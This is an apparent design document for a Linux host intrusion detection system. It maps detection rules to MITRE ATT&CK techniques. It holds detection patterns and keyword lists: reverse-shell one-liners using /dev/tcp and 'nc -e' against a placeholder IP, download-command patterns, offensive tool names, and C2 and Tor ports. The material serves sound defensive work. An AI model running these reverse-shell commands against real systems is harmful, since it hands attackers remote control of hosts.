# MITRE ATT&CK Mapping

**Project:** ARGUS Host-Based Intrusion Detection System  
**Framework:** MITRE ATT&CK® for Enterprise v14  
**Platform:** Linux (Fedora)

---

## Overview

This document maps every detection rule in the HIDS agent to the corresponding MITRE ATT&CK technique. Coverage spans four monitoring modules:

| Module | Source File | Techniques Covered |
|---|---|---|
| File Integrity Monitor | `modules/file_monitor.py` | T1565, T1070.004, T1105 |
| Authentication Monitor | `modules/auth_monitor.py` | T1110, T1078, T1021.004, T1548.003, T1136.001, T1531, T1098 |
| Process Monitor | `modules/process_monitor.py` | T1036, T1036.005, T1059, T1059.004, T1496, T1548.001, T1055, T1071 |
| Network Monitor | `modules/network_monitor.py` | T1046, T1071, T1090, T1090.003, T1041, T1219, T1571 |

---

## Tactic: Impact

### T1565 — Data Manipulation
**Tactic:** Impact  
**Module:** File Integrity Monitor  
**Event type:** `file_modified`  

Detects when a monitored file's SHA256 hash changes between scan cycles. Applies to all paths under `monitored_paths`. Changes to critical paths (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/ssh/sshd_config`, `/root/.ssh`) produce a `critical` alert; changes to non-critical paths produce `medium`.

```json
{
  "event_type": "file_modified",
  "severity": "critical",
  "filepath": "/etc/passwd",
  "old_hash": "abc123...",
  "new_hash": "def456...",
  "mitre_technique": "T1565"
}
```

---

## Tactic: Defense Evasion

### T1070.004 — Indicator Removal: File Deletion
**Tactic:** Defense Evasion  
**Module:** File Integrity Monitor  
**Event type:** `file_deleted`  

Detects when a file present in the baseline is no longer found on disk. File deletion is a common technique used by attackers to remove evidence of compromise or to disable security tools. Deleted critical files produce `critical`; deleted non-critical files produce `high`.

```json
{
  "event_type": "file_deleted",
  "severity": "critical",
  "filepath": "/etc/sudoers",
  "old_hash": "abc123...",
  "mitre_technique": "T1070.004"
}
```

### T1036 — Masquerading
**Tactic:** Defense Evasion  
**Module:** Process Monitor  
**Event type:** `suspicious_process_name`  

Detects processes whose names match a configured list of known malicious or suspicious tool names (e.g. `nc`, `netcat`, `ncat`, `socat`, `msfconsole`, `meterpreter`, `xmrig`). Attackers frequently rename tools to blend in, so any name match is raised as `high` severity.

### T1036.005 — Masquerading: Match Legitimate Name or Location
**Tactic:** Defense Evasion  
**Module:** Process Monitor  
**Event type:** `process_from_suspicious_path`  

Detects executables running from directories where legitimate system binaries do not reside: `/tmp`, `/var/tmp`, `/dev/shm`, and hidden home-directory paths (`/home/*/.*`). Attackers drop tools into world-writable directories and execute them to avoid touching protected paths.

```json
{
  "event_type": "process_from_suspicious_path",
  "severity": "high",
  "exe": "/tmp/backdoor",
  "mitre_technique": "T1036.005"
}
```

---

## Tactic: Command and Control

### T1071 — Application Layer Protocol
**Tactic:** Command and Control  
**Module:** Network Monitor, Process Monitor  
**Event types:** `connection_to_suspicious_port`, `unusual_outbound_connection`, `suspicious_network_connection`  

Detects outbound connections to ports commonly used for C2 communication (default suspicious list includes 4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345) and connections to user-defined blacklisted IPs.

### T1090 — Proxy
**Tactic:** Command and Control  
**Module:** Network Monitor  
**Event type:** `proxy_connection_detected`  

Detects connections to common proxy ports: 3128 (Squid), 8080, 8888, 1080 (SOCKS), 3129, 8123. Attackers use proxies to obscure C2 traffic and exfiltration paths.

```json
{
  "event_type": "proxy_connection_detected",
  "severity": "medium",
  "proxy_port": 3128,
  "mitre_technique": "T1090"
}
```

### T1090.003 — Proxy: Multi-hop Proxy (Tor)
**Tactic:** Command and Control  
**Module:** Network Monitor  
**Event type:** `tor_connection_detected`  

Detects connections to known Tor service ports: 9001, 9030, 9050, 9051, 9150. Tor usage may indicate exfiltration or anonymous C2 communication.

```json
{
  "event_type": "tor_connection_detected",
  "severity": "high",
  "remote_addr": "198.51.100.1:9050",
  "mitre_technique": "T1090.003"
}
```

### T1219 — Remote Access Software
**Tactic:** Command and Control  
**Module:** Network Monitor  
**Event type:** `connection_to_suspicious_port`  

Remote access tools such as reverse shells and RATs commonly connect outbound to attacker-controlled ports. The combination of process monitoring (command-line patterns) and network monitoring (port checks) provides layered detection.

### T1571 — Non-Standard Port
**Tactic:** Command and Control  
**Module:** Network Monitor  
**Event type:** `new_listening_port`  

Detects new ports entering the `LISTEN` state that were not present when the baseline was created. Attackers may open bind shells or install backdoor daemons that listen on non-standard ports.

```json
{
  "event_type": "new_listening_port",
  "severity": "critical",
  "port": 4444,
  "process_name": "nc",
  "mitre_technique": "T1571"
}
```

---

## Tactic: Credential Access

### T1110 — Brute Force
**Tactic:** Credential Access  
**Module:** Authentication Monitor  
**Event types:** `ssh_failed_login`, `brute_force_attack`, `invalid_user_attempt`, `sudo_auth_failure`  

Tracks failed SSH password attempts per `username@ip` pair within a rolling time window (default: 5 failures in 300 seconds). When the threshold is exceeded a `brute_force_attack` event is raised at `critical` severity and the counter for that pair is reset.

Individual failed attempts and invalid-user attempts are always recorded at `medium` and `high` respectively, regardless of the brute-force threshold.

```json
{
  "event_type": "brute_force_attack",
  "severity": "critical",
  "username": "root",
  "source_ip": "203.0.113.5",
  "attempt_count": 7,
  "time_window": 300,
  "mitre_technique": "T1110"
}
```

---

## Tactic: Lateral Movement

### T1021.004 — Remote Services: SSH
**Tactic:** Lateral Movement  
**Module:** Authentication Monitor  
**Event type:** `ssh_successful_login`  

Records every successful SSH authentication (password or public key). While a single successful login is not an alert (`info` severity), it provides an audit trail useful for correlating with other suspicious events.

---

## Tactic: Persistence / Privilege Escalation

### T1078 — Valid Accounts
**Tactic:** Persistence, Privilege Escalation, Initial Access  
**Module:** Authentication Monitor  
**Event type:** `suspicious_username_attempt`  

Fires when a login attempt — successful or failed — uses a username from the configured `suspicious_usernames` list (default: `admin`, `administrator`, `root`, `test`, `guest`, `oracle`, `postgres`). These accounts are frequently targeted or should never be used for remote login on a hardened system.

### T1136.001 — Create Account: Local Account
**Tactic:** Persistence  
**Module:** Authentication Monitor  
**Event type:** `user_account_created`  

Detects `useradd` entries in `/var/log/secure`. Creating a new local account is a common persistence mechanism.

```json
{
  "event_type": "user_account_created",
  "severity": "high",
  "username": "backdoor",
  "mitre_technique": "T1136.001"
}
```

### T1548.001 — Abuse Elevation Control: Setuid and Setgid
**Tactic:** Privilege Escalation, Defense Evasion  
**Module:** Process Monitor  
**Event type:** `suspicious_suid_execution`  

Detects processes whose executable has the SUID bit set and is located in a world-writable directory (`/tmp`, `/var/tmp`, `/dev/shm`). Legitimate SUID binaries reside in system directories; a SUID binary in a writable directory almost always indicates exploitation or attacker staging.

```json
{
  "event_type": "suspicious_suid_execution",
  "severity": "critical",
  "exe": "/tmp/evil",
  "mitre_technique": "T1548.001"
}
```

### T1548.003 — Abuse Elevation Control: Sudo and Sudo Caching
**Tactic:** Privilege Escalation, Defense Evasion  
**Module:** Authentication Monitor  
**Event type:** `sudo_command_executed`  

Logs every `sudo` invocation with the executing user, target user, working directory, and full command. Provides a complete audit trail for privilege use and can surface unexpected escalations.

---

## Tactic: Execution

### T1059 — Command and Scripting Interpreter
**Tactic:** Execution  
**Module:** Process Monitor  
**Event type:** `suspicious_command_execution`  

Matches process command-line arguments against a configurable list of dangerous patterns including: `bash -i`, `/dev/tcp`, `/dev/udp`, `nc -e`, `python -c`, `perl -e`, `ruby -e`, `base64 -d`, `wget http`, `curl http`. Any match produces a `critical` event.

### T1059.004 — Command and Scripting Interpreter: Unix Shell
**Tactic:** Execution  
**Module:** Process Monitor  
**Event type:** `reverse_shell_detected`  

Uses regex matching against process command lines to detect classic Unix reverse shell one-liners:

| Pattern | Example |
|---|---|
| `/dev/tcp/<ip>/<port>` | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` |
| `/dev/udp/<ip>/<port>` | UDP variant |
| `nc.*-e.*(bash\|sh)` | `nc -e /bin/bash 10.0.0.1 4444` |
| `bash.*-i.*>&` | Bash redirect reverse shell |
| `python.*socket.*connect` | Python socket reverse shell |
| `perl.*socket.*connect` | Perl socket reverse shell |
| `ruby.*socket.*connect` | Ruby socket reverse shell |

---

## Tactic: Resource Development / Impact

### T1496 — Resource Hijacking
**Tactic:** Impact  
**Module:** Process Monitor  
**Event types:** `cryptocurrency_miner_detected`, `possible_cryptocurrency_miner`, `high_resource_usage`  

Three complementary checks:

1. **Name/command match** — process name or command line contains a known miner string (`xmrig`, `minerd`, `ccminer`, `claymore`, `ethminer`, `phoenix`, `nbminer`, `cryptonight`, `monero`, `stratum`). Produces `critical`.
2. **High CPU + mining pool port** — process using > 70% CPU has an active connection to a port commonly used by mining pools (3333, 4444, 5555, 7777, 8888, 9999). Produces `high`.
3. **Generic high resource usage** — CPU > `cpu_threshold` (default 80%) or memory > `memory_threshold` (default 80%). Produces `high` or `critical` depending on the exact value.

---

## Tactic: Discovery

### T1046 — Network Service Discovery
**Tactic:** Discovery  
**Module:** Network Monitor  
**Event type:** `port_scan_detected`  

Tracks the number of unique destination ports accessed from a single remote IP within a rolling window (default: 10 ports in 60 seconds). Exceeding the threshold raises a `critical` event. The history for that IP is then cleared to prevent alert storms from a sustained scan.

```json
{
  "event_type": "port_scan_detected",
  "severity": "critical",
  "source_ip": "203.0.113.10",
  "unique_ports_accessed": 18,
  "time_window": 60,
  "mitre_technique": "T1046"
}
```

---

## Tactic: Exfiltration

### T1041 — Exfiltration Over C2 Channel
**Tactic:** Exfiltration  
**Module:** Network Monitor  
**Event type:** `unusual_outbound_connection`  

Flags established outbound connections to external IPs on ports not in `allowed_outbound_ports` (default allowed: 80, 443, 22, 53, 123, 8080, 8443) by processes not in the whitelist. Data exfiltration often uses non-standard ports or unexpected processes to send data out.

---

## Tactic: Persistence

### T1105 — Ingress Tool Transfer
**Tactic:** Command and Control  
**Module:** File Integrity Monitor  
**Event type:** `file_created`  

Detects new files appearing inside `critical_paths` (e.g. a new binary dropped into `/root/.ssh` or a new file created under `/etc/`). New files in critical locations are a strong indicator of tool staging or configuration tampering.

### T1531 — Account Access Removal
**Tactic:** Impact  
**Module:** Authentication Monitor  
**Event type:** `user_account_deleted`  

Detects `userdel` entries in `/var/log/secure`. Account deletion may indicate an attacker removing traces of a backdoor account or sabotaging system access.

### T1098 — Account Manipulation
**Tactic:** Persistence  
**Module:** Authentication Monitor  
**Event type:** `password_changed`  

Detects `passwd` entries in `/var/log/secure`. Unexpected password changes may indicate account takeover or preparation for persistent access.

---

## Coverage Summary Table

| MITRE ID | Technique Name | Tactic | Module | Severity |
|---|---|---|---|---|
| T1036 | Masquerading | Defense Evasion | Process Monitor | high |
| T1036.005 | Match Legitimate Name/Location | Defense Evasion | Process Monitor | high |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Network Monitor | medium |
| T1046 | Network Service Discovery | Discovery | Network Monitor | critical |
| T1059 | Command and Scripting Interpreter | Execution | Process Monitor | critical |
| T1059.004 | Unix Shell | Execution | Process Monitor | critical |
| T1070.004 | File Deletion | Defense Evasion | File Monitor | critical/high |
| T1071 | Application Layer Protocol | C2 | Network Monitor | high/medium |
| T1078 | Valid Accounts | Multiple | Auth Monitor | high |
| T1090 | Proxy | C2 | Network Monitor | medium |
| T1090.003 | Multi-hop Proxy (Tor) | C2 | Network Monitor | high |
| T1098 | Account Manipulation | Persistence | Auth Monitor | medium |
| T1105 | Ingress Tool Transfer | C2 | File Monitor | high |
| T1110 | Brute Force | Credential Access | Auth Monitor | critical |
| T1136.001 | Create Local Account | Persistence | Auth Monitor | high |
| T1219 | Remote Access Software | C2 | Network Monitor | high |
| T1496 | Resource Hijacking | Impact | Process Monitor | critical/high |
| T1531 | Account Access Removal | Impact | Auth Monitor | high |
| T1548.001 | Setuid and Setgid | Privilege Escalation | Process Monitor | critical |
| T1548.003 | Sudo and Sudo Caching | Privilege Escalation | Auth Monitor | info |
| T1565 | Data Manipulation | Impact | File Monitor | critical/medium |
| T1571 | Non-Standard Port | C2 | Network Monitor | critical/medium |
| **T1021.004** | **Remote Services: SSH** | **Lateral Movement** | **Auth Monitor** | **info** |

**Total techniques covered: 23**

---

## References

- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [MITRE ATT&CK Linux Platform](https://attack.mitre.org/matrices/enterprise/linux/)
